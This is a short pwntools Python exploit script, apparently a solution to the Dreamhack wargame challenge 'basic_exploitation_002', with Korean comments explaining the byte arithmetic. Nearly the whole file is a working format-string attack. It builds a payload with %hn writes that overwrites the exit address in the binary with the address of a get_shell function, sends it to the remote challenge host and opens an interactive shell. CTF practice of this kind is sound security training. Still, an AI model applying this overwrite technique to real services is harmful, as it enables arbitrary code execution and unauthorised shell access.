from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 10698)
elf = ELF("./basic_exploitation_002")

get_shell = elf.symbols['get_shell']
# get_shell = 0x08048609  # 134514185

addr_exit = 0x8048648  # exit 함수가 실행되는 코드 섹션의 주소

# 0x0804 = 2052
# 0x8609 = 34313
payload = b"%2052c%7$hn"        # 0x0804 = 2052 : 길이 11bytes
payload += b"%32261c%8$hn"      # 0x8609 = 34313 (34313 - 2052 = 32261) : 길이 12byte
payload += b"a"                 # 24bytes로 맞추기 위해 1bytes 추가
payload += p32(addr_exit + 2)   # 여기까지 28바이트 차지
payload += p32(addr_exit)

p.send(payload)
p.interactive()
